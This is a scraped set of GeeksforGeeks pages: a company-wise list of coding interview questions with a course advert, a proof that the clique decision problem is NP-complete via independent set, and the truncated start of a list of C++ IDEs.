contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Must Do Coding Questions Company-wise Next last_page Cisco Systems Interview Experience | On-Campus 2021 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesUnderstanding "extern" keyword in C More related articles in Articles How to write a Pseudo Code?Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Mutex vs SemaphoreSQL | GROUP BY room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Must Do Coding Questions Company-wise - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderWhat is Memory Leak? How can we avoid? Must Do Coding Questions Company-wise Last Updated: 28-10-2020 Topic : Google Facebook Microsoft Adobe Oracle Amazon D E Shaw MAQ Software Directi Yahoo Accolite Walmart Labs Samsung Paytm Ola Cabs Flipkart SAP Labs VMware Cisco Goldman Sachs MakeMyTrip Snapdeal Qualcomm Payu Intuit Google : Subarray with given sum Maximum Index Finding the numbers Longest valid Parentheses Jumping Numbers Connect Nodes at Same Level Count BST nodes that lie in a given range Implement LRU Cache Interleaved Strings Find triplets with zero sum Egg Dropping Puzzle Word Break Problem Check if a Binary Tree contains duplicate subtrees of size 2 or more Find largest word in dictionary by deleting some characters of given string Modular Exponentiation (Power in Modular Arithmetic) Facebook : Subarray with given sum Find all pairs with a given sum Total Decoding Messages Word Boggle Activity Selection Minimum Depth of a Binary Tree Implement strstr Multiply two strings K-Palindrome Find triplets with zero sum Largest subset whose all elements are Fibonacci numbers Look-and-Say Sequence Converting Decimal Number lying between 1 to 3999 to Roman Numerals Convert Ternary Expression to Binary Tree Maximum Rectangular Area in a Histogram Amazon : K largest elements from a big file or array Reverse a Linked List in groups of given size Implement a stack with push(), pop() and min() in O(1) time Add two numbers represented by linked lists Convert a Binary tree to DLL Stock span problem Next larger element Edit distance Maximum of all subarrays of size k Pythagorean Triplet Print a Binary Tree in Vertical Order Level order traversal Smallest window in a string containing all the characters of another string Find the number of islands Detect and Remove Loop in a Linked List Check if a binary tree is BST or not Boolean Parenthesization Arrange given numbers to form the biggest number Implement LRU Cache Maximum difference between node and its ancestor in Binary Tree Microsoft : Key Pair Is Binary Number Multiple of 3 Kadane’s Algorithm Missing number in array Majority Element Search in a Rotated Array Check for BST Finding middle element in a linked list Root to leaf path sum Reverse a linked list Remove every k’th node Merge 2 sorted linked list in reverse order Longest Even Length Substring such that Sum of First and Second Half is same k largest(or smallest) elements in an array | added Min Heap method Write an Efficient Function to Convert a Binary Tree into its Mirror Tree Determine if Two Trees are Identical Adobe : Search in a Rotated Array Subset Sum Problem Reverse words in a given string Sort an array of 0s, 1s and 2s Minimum number of jumps Check for BST Root to leaf path sum Sum Tree Finding middle element in a linked list Reverse a linked list Level order traversal in spiral form Right View of Binary Tree Remove duplicate element from sorted Linked List Merge Sort for Linked List Count set bits in an integer Oracle : 0 – 1 Knapsack Problem Search in a matrix Power of 2 Palindrome Root to leaf path sum Kadane’s Algorithm Binary Search Implement Queue using Linked List Connect Nodes at Same Level Remove loop in Linked List Implement Stack using Queues Implement Queue using Stacks Remove duplicate element from sorted Linked List Search in a row wise and column wise sorted matrix Find the first repeating element in an array of integers D E Shaw : Majority Element Search in a Rotated Array Sum of Middle Elements of two sorted arrays Non Repeating Character Kadane’s Algorithm Intersection of two sorted Linked lists Detect Loop in linked list Print all nodes that don’t have sibling Two Mirror Trees Intersection Point in Y Shapped Linked Lists Trie | (Insert and Search) Implement Queue using Stacks Implement Stack using Queues Find the number of islands Copy Set Bits in Range Directi : Maximum of all subarrays of size k Search in a matrix Word Boggle Jumping Numbers Transform String Solve the Sudoku Find Nth root of M Array Pair Sum Divisibility Problem Largest zigzag sequence Maximum Intervals Overlap Max rectangle Maximum path sum Maximize Dot Product Excel Sheet | Part – 1 Probability of Knight MAQ Software : Sort an array of 0s, 1s and 2s Permutations of a given string Rotate Array by n elements Non Repeating Character Nth Fibonacci Number Finding middle element in a linked list n’th node from end of linked list Detect Loop in linked list Implement Queue using Stacks Find Missing And Repeating Find the Closest Element in BST Check if a linked list is Circular Linked List Reverse a String Reverse words in a given string Egg Dropping Puzzle Yahoo : First non-repeating character in a stream Find median in a stream Largest prime factor Form coils in a matrix Word Boggle Largest Product Palindrome Surpasser Count Return two prime numbers Sort a stack Three way partitioning LRU Cache Serialize and Deserialize a Binary Tree Split a Circular Linked List into two halves Interleaved Strings Max Sum without Adjacents Accolite : Count Squares Longest Prefix Suffix N-Queen Problem Coin Change Permutations of a given string Stock buy and sell Longest Palindrome in a String Sum of two numbers represented as arrays Max sum submatrix Maximum sum Rectangle Root to leaf path sum Lowest Common Ancestor in a Binary Tree Level order traversal in spiral form Implement Stack using Queues n’th node from end of linked list Walmart Labs : Longest consecutive subsequence Largest number in K swaps k largest elements Word Break Find the highest occurring digit in prime numbers in a range Count all possible paths from top left to bottom right Minimum Platforms Parenthesis Checker Implement LRU Cache Josephus Problem Top View of Binary Tree Intersection of Two Linked Lists Alien Dictionary Remove Loop in Linked List Wildcard Pattern Matching Samsung : Longest Increasing Subsequence Next larger element Permutations of a given string Next greater number set digits Finding middle element in a linked list Root to leaf path sum Detect Loop in linked list Left View of Binary Tree Implement Queue using Linked List Egg Dropping Puzzle Total number of possible Binary Search Trees with n keys Count number of bits to be flipped to convert A to B Implement two stacks in an array Given only a pointer/reference to a node to be deleted in a singly linked list, how do you delete it? Paytm : Sort an array of 0s, 1s and 2s Reverse words in a given string Reverse a linked list Reverse a Linked List in groups of given size Max Sum without Adjacents Mirror Tree Flattening a Linked List Check for Balanced Tree Find the number of islands Coin Change Count frequencies of all elements in array in O(1) extra space and O(n) time Convert array into Zig-Zag fashion Find the row with maximum number of 1s Maximum Rectangular Area in a Histogram Ola Cabs : Kadane’s Algorithm Missing number in array Sort an array of 0s, 1s and 2s Search in a matrix Left View of Binary Tree Mirror Tree Connect Nodes at Same Level K distance from root Level order traversal in spiral form Non Repeating Character Find the number of islands Find the character in first string that is present at minimum index in second string Maximum difference between two elements such that larger element appears after the smaller number Find the element that appears once in sorted array Boolean Matrix Problem Flipkart : Kadane’s Algorithm 0 – 1 Knapsack Problem Inversion of array Consecutive 1’s not allowed Finding middle element in a linked list Get minimum element from stack Left View of Binary Tree Add two numbers represented by linked lists Connect Nodes at Same Level Sum of dependencies in a graph Maximum of all subarrays of size k Possible words from Phone digits Reverse Level Order Traversal Implement Queue using Stack Maximum Width of Tree SAP Labs : Sort an array of 0s, 1s and 2s Check if a number is Bleak Reverse words in a given string Remove Spaces from string Second Largest Check if a number is power of another number Reverse a linked list Get minimum element from stack BFS traversal of graph Find median in a stream of integers Quick Sort GCD of Array LCM And GCD Heap Sort Bubble Sort VMware : Longest Common Subsequence Maximum Index Array to BST Egg Dropping Puzzle K’th smallest element Check for BST Finding middle element in a linked list Reverse a linked list Detect Loop in linked list Run Length Encoding Height of Binary Tree Infix to Postfix Diameter of Binary Tree Mirror Tree Boolean Matrix Problem Cisco : Missing number in array Reverse words in a given string Permutations of a given string Array to BST Counbt set bits Reverse a linked list Level order traversal Minimum Spanning Tree Does array represent Heap Kth largest element in a stream Escape the jail K’th smallest element Insertion Sort Bubble Sort Goldman Sachs : Reverse words in a given string Overlapping rectangles Column name from a given column number Non Repeating Character Total Decoding Messages Sum Tree Get minimum element from stack Flattening a Linked List Sort a stack using Recursion Intersection Point in Y Shapped Linked Lists Stock buy and sell Egg Dropping Puzzle Check for Balanced Tree Check if two arrays are equal or not Implement Queue using Stacks MakeMyTrip : Distinct palindromic substrings Two water Jug problem Minimum Cost Path Transpose of Matrix Smallest window in a string containing all the characters of another string Check Mirror in N-ary tree Longest Prefix Suffix Maximum Difference Nuts and Bolts Problem N meetings in one room String formation from substring Longest Common Subsequence Next Permutation Trailing zeroes in factorial Egg Dropping Puzzle Snapdeal : Fighting the darkness Money Division Group Anagrams Together Pangram Strings 0 – 1 Knapsack Problem Longest Arithmetic Progression Next greater number set digits Number of Coins Check If two Line segments Intersect Two numbers with sum closest to zero Parenthesis Checker Maximum Rectangular Area in a Histogram Smallest Positive missing number Find the number of islands Reverse a Linked List in groups of given size Qualcomm : Find length of Loop Implement strstr Min distance between two given nodes of a Binary Tree Delete a node from BST Left View of Binary Tree Intersection Point in Y Shapped Linked Lists Check for BST Reverse a linked list Detect Loop in linked list Reverse Bits Next Permutation Array Subset of another array Set Bits Find Prime numbers in a range Subsequence matching Payu : Reverse each word in a given string First non-repeating character in a stream Next larger element 0 – 1 Knapsack Problem Leaders in an array Trapping Rain Water Pattern Searching Implement Atoi Lowest Common Ancestor in a Binary Tree Level order traversal in spiral form Flattening a Linked List Finding middle element in a linked list Missing number in array Kadane’s Algorithm Count possible ways to construct buildings Intuit : Element with left side smaller and right side greater Find median in a stream Product array puzzle Count Occurences of Anagrams Maximum Sub Array Binary Array Sorting Sort a Stack Find the number of islands Remove duplicates from an unsorted linked list Implement LRU Cache Max Rectangle Reverse a linked list Pairwise swap elements of a linked list by swapping data Find the missing no in string Depth First Traversal for a Graph Important Links : Difficulty-wise ordered Coding questions for Interview and Competitive Programming Aptitude questions asked in round 1 : Placements Course designed for this purpose. MCQs asked from different computer science subjects : Subject-Wise Quizzes Interview theory and coding questions of all companies : Company wise all practice questions. Interview experiences of all companies : Interview corner. You may also check our latest online course series to learn DS & Algo is named DSA, which covers everything about Data Structures from Basic to Advanced. This is a 10 weeks long online certification program specializing in Data Structures & Algorithms which includes pre-recorded premium Video lectures & programming questions for practice. You will learn algorithmic techniques for solving various computational problems and will implement more than 200 algorithmic coding problems. This course offers you a wealth of programming challenges that you may face at your next job interview. The course focuses mainly on Data Structure & Algorithms: the key to selection in top product based companies. Key Features of the Course Well organised tutorials on Data-Structures and Algorithms prepared by the GeeksforGeeks Team. Premium video lectures by Mr. Sandeep Jain, Founder and C.E.O of GeeksforGeeks. Dedicated doubt solving team to assist you. Weekly Assessment Tests with Video Solutions. Performance-Based Certificate. Internship Opportunities at GeeksforGeeks. The courses are self-paced: Anyone can register anytime, make payment and begin the course. And, many more. The course is available in two versions: With Doubt Assistance: The price of the self-paced online DSA course with doubt assistance is INR 3,999. Click here to purchase your ticket. Without Doubt Assistance: The price of the self-paced online DSA course without doubt assistance is INR 2,499. Click here to purchase your ticket . Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Recommended Posts:Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Questions for Companies like TCS, CTS, HCL, IBM …How to attempt Function Coding Questions?Must have books for Placements PreparationA Must Do Free Interview Preparation Course by GeeksforGeeksWhy Data Structures and Algorithms are "Must Have" for Developers and Where to learn them : AnsweredPlacement 100 : Complete Interview Preparation package you must have this Placement SeasonTop 3 tips an interviewee must have in mindMinimum number of rabbits that must be present in the forestHow to answer a coding question in an Interview?Practice for cracking any coding interview10 Most asked Questions from Java ProgrammersTop 10 algorithms in Interview QuestionsCommonly asked Interview Questions for Front End DevelopersSQL Interview QuestionsJava Interview Questions on ConstructorsTop 20 Dynamic Programming Interview QuestionsTop 20 Greedy Algorithms Interview QuestionsTop 20 Backtracking Algorithm Interview QuestionsTop 20 Hashing Technique based Interview QuestionsImproved By : mrindiadev Article Tags : Articlesinterview-preparationplacement preparation thumb_up 48 To-do Done 3.3 Based on 72 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page TCS Codevita Interview Experience 2020 (Digital Offer) Next last_page Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesUnderstanding "extern" keyword in C More related articles in Articles How to write a Pseudo Code?Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Mutex vs SemaphoreSQL | GROUP BY room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Proof that Clique Decision problem is NP-Complete | Set 2 - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Maximal Independent Set in an Undirected GraphMaximal independent set from a given Graph using BacktrackingFind if an undirected graph contains an independent set of a given sizeProof that Independent Set in Graph theory is NP CompleteProof that Clique Decision problem is NP-CompleteProof that Clique Decision problem is NP-Complete | Set 2Proof that Hamiltonian Cycle is NP-CompleteProof that Hamiltonian Path is NP-CompleteProof that vertex cover is NP completeVertex Cover Problem | Set 2 (Dynamic Programming Solution for Tree)Vertex Cover Problem | Set 1 (Introduction and Approximate Algorithm)Finding minimum vertex cover size of a graph using binary searchStable Marriage ProblemSum of dependencies in a graphActivity Selection Problem | Greedy Algo-1Kruskal’s Minimum Spanning Tree Algorithm | Greedy Algo-2Prim’s Minimum Spanning Tree (MST) | Greedy Algo-5Prim’s MST for Adjacency List Representation | Greedy Algo-6Dijkstra’s shortest path algorithm | Greedy Algo-7Dijkstra’s Algorithm for Adjacency List Representation | Greedy Algo-8Dijkstra’s shortest path algorithm using set in STLDijkstra’s Shortest Path Algorithm using priority_queue of STLDijkstra’s shortest path algorithm in Java using PriorityQueueJava Program for Dijkstra’s shortest path algorithm | Greedy Algo-7Java Program for Dijkstra’s Algorithm with Path PrintingAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops) Proof that Clique Decision problem is NP-Complete | Set 2 Last Updated: 01-07-2020 Prerequisite: NP-Completeness, Clique problem. A clique in a graph is a set of vertices where each vertex shares an edge with every other vertex. Thus, a clique in a graph is a subgraph which is a complete graph. Problem: Given a graph G(V, E) and an integer K, the problem is to determine if the graph contains a clique of size K. Explanation: An instance of the problem is an input specified to the problem. An instance of the Clique problem is a graph G (V, E) and a positive integer K, and the problem is to check whether a clique of size K exists in G. Since an NP-Complete problem, by definition, is a problem which is both in NP and NP-hard, the proof for the statement that a problem is NP-Complete consists of two parts: The problem itself is in NP class All other problems in NP class can be polynomial-time reducible to that. (B is polynomial-time reducible to C is denoted as ) If the 2nd condition is only satisfied then the problem is called NP-Hard. But it is not possible to reduce every NP problem into another NP problem to show its NP-Completeness all the time. That is why if we want to show a problem is NP-Complete we just show that the problem is in NP and any NP-Complete problem is reducible to that, then we are done, i.e. if B is NP-Complete and for C in NP, then C is NP-Complete. In this article, we will prove that the Clique Detection Problem is NP-Complete by the help of Independent Set problem, which is NP-Complete. Refer to Proof that Clique Decision problem is NP-Complete, for the proof with the help of Boolean Satisfiability Problem. Clique Problem is in NP If any problem is in NP, then, given a ‘certificate’, which is a solution to the problem and an instance of the problem (a graph G and a positive integer K, in this case), we will be able to verify (check whether the solution given is correct or not) the certificate in polynomial time. The certificate is a subset V’ of the vertices, which comprises the vertices belonging to the clique. We can validate this solution by checking that each pair of vertices belonging to the solution are adjacent, by simply verifying that they share an edge with each other. This can be done in polynomial time, that is O(V +E) using the following strategy for graph G(V, E): flag=true For every pair {u, v} in the subset V’: Check that these two vertices {u, v} share an edge If there is no edge, set flag to false and break If flag is true: Solution is correct Else: Solution is incorrect Clique Problem is NP-Hard To prove that the clique problem is NP-Hard, we take the help of a problem that is already NP-Hard and show that this problem can be reduced to the Clique problem. For this, we consider the Independent Set problem, which is NP-Complete (and hence NP-Hard). Every instance of the independent set problem consisting of the graph G (V, E) and an integer K can be converted to the required graph G’ (V’, E’) and K’ of the Clique problem. We will construct the graph G’ by the following modifications: V’ =V, that is all the vertices of graph G are a part of the graph G’ E’ = complement of the edges E, that is, the edges not present in the original graph G. The graph G’ is the complementary graph of G. The time required to compute the complementary graph G’ requires a traversal over all the vertices and edges. Time complexity: O (V+E) We will now prove that the problem of computing the clique indeed boils down to the computation of the independent set. The reduction can be proved by the following two propositions: Let us assume that the graph G contains a clique of size K. The presence of clique implies that there are K vertices in G, where each of the vertices is connected by an edge with the remaining vertices. This further shows that since these edges are contained in G, therefore they can’t be present in G’. As a result, these K vertices are not adjacent to each other in G’ and hence form an Independent Set of size K. We assume that the complementary graph G’ has an independent set of vertices of size K’. None of these vertices shares an edge with any other vertices. When we complement the graph to obtain G, these K vertices will share an edge and hence, become adjacent to each other. Therefore, the graph G will have a clique of size K. Thus, we can say that there is a clique of size K in graph G if there is an independent set of size K in G’ (complement graph). Therefore, any instance of the clique problem can be reduced to an instance of the Independent Set problem. Thus, the clique problem is NP-Hard. Conclusion: Hence, the Clique Decision problem is NP-Complete Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Proof that Clique Decision problem is NP-CompleteTwo Clique Problem (Check if Graph can be divided in two Cliques)Maximal Clique Problem | Recursive SolutionProof that traveling salesman problem is NP HardProof that Subgraph Isomorphism problem is NP-CompleteProof that Collinearity Problem is NP CompleteProof that Independent Set in Graph theory is NP CompleteProof that Dominant Set of a Graph is NP-CompleteProof that Hamiltonian Path is NP-CompleteProof that vertex cover is NP completeProof that Hamiltonian Cycle is NP-CompleteProof that 4 SAT is NP completeProof that SAT is NP CompleteSet Cover Problem | Set 1 (Greedy Approximate Algorithm)Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Travelling Salesman Problem | Set 2 (Approximate using MST)Vertex Cover Problem | Set 2 (Dynamic Programming Solution for Tree)K Centers Problem | Set 1 (Greedy Approximate Algorithm)Hungarian Algorithm for Assignment Problem | Set 1 (Introduction)Exact Cover Problem and Algorithm X | Set 1yashchuahanCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisData StructuresGraphAlgorithms-NP CompleteNP CompleteNPHardtime complexity Practice Tags : Data StructuresGraph thumb_up 1 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Count of subarrays of size K having at least one pair with absolute difference divisible by K-1 Next last_page Finding shortest path between any two nodes using Floyd Warshall Algorithm Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesDifference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Data Structures Doubly Linked List | Set 1 (Introduction and Insertion)Abstract Data TypesDifference between Stack and Queue Data StructuresImplementing a Linked List in Java using ClassRecursive Practice Problems with Solutions room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Top 5 IDEs for C++ That You Should Try Once - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Top 5 IDEs for C++ That You Should Try OnceTop 10 Python IDE and Code Editors in 2020IDE for Python programming on WindowsTop 10 Useful GitHub Repos That Every Developer Should Follow5 GitHub Repositories that Every New Developer Must FollowFetch top 10 starred repositories of user on GitHub | PythonAuthentication using Python requestsGET and POST requests using PythonPOST method – Python requestsGET method – Python requestsresponse.json() – Python requestsresponse.content – Python requestsResponse Methods – Python requestsresponse.text – Python requestsresponse.headers – Python requestsresponse.cookies – Python requestsSession Objects – Python requestsvars() function in PythonDifference between dir() and vars() in Pythondir() function in PythonHelp function in PythonPython | __import__() functionPython | range() does not return an iteratorVector in C++ STLThe C++ Standard Template Library (STL)Map in C++ Standard Template Library (STL)std::sort() in C++ STLArrays in C/C++Converting Strings to Numbers in C/C++Initialize a vector in C++ (5 different ways) Top 5 IDEs for C++ That You Should Try Once Last Updated: 25-08-2020 In the previous years, To create an application from scratch a developer would have to struggle a lot. Because to create an software application it would take many steps beginning from Coding, Compiling, Testing, Debugging, Build, and Deployment. All these different phases would need different packages to be installed and was difficult to maintain by a Developer. So to increase the productivity and speedup the process of software development, All these packages that are essential for development are integrated or combined into single environment known as IDE(Integrated Development environment) which made modern software development easier and faster. A typical IDE must possess few features such as syntax highlighting, auto-code completion, auto-save code, code search, compiler, refactoring, debugging, version control, build and deployment etc. If you are an C++ programmer then below are some free IDEs for software development: 1. Visual Studio Code Visual Studio Code is a most popular free open-source code editor developed by Microsoft which supports platform like Windows, Linux, Mac. Microsoft provides extension for C++ called “Microsoft C/C++” which can be easily found by searching in extensions section.There is another extension called ” code runner ” that allows to run code snippets as output. Features : Free to use light-weight Auto-code completion syntax highlighting command line area debugger themes and extensions deployment tools Git support 2. Code:: Blocks Code::blocks is a open-source and free IDE for C and C++ which can be used on multiple platforms, build in C++ using a GUI widget tool called “wxWidget”. This IDE is specially used for programming in C++ with smooth performance and features. Features: Free to use Cross-platform Extensible with plugins Multiple compiler support Very fast performance Debugger Customizable Good interface 3. CLion Clion is a modern IDE by JetBrains which is designed to run C and C++ on various platforms like windows, Linux, and MacOS. It provides intelligent code assistance support so that the main focus must be on important things. Features : Easy to start new project Smart code completion Easy debugging Refactoring Smart Code analysis Customization Built-in tools 4. Eclipse Eclipse is one of the most popular and powerful IDE for C++ developers. It is also open-source and free to use with excellent community support. It supports multi-platforms like Windows, Linux and MacOS and many users find it easy to use. Features : Easy to use Auto-completion of code Open-source source navigation syntax highlighting visual debugging tools Debugging code refactoring 5. CodeLite CodeLite is one of the best C++ IDE to use which is free, open-source written in C++ and specialized to run on various platforms such as Windows, MacOS, Linux. It also provides many features as any C++ IDE. Features : Project management code completion syntax highlighting interactive debugger code refactoring Unit testing Rated as one of the most sought after skills in the industry, own the basics of coding with our C++ STL Course and master the very concepts by intense problem-solving. My Personal Notes arrow_drop_up Save Recommended Posts:Top 7 Google Play Store Tips That You Should TryTop 10 Tools That Every Web Developer Must 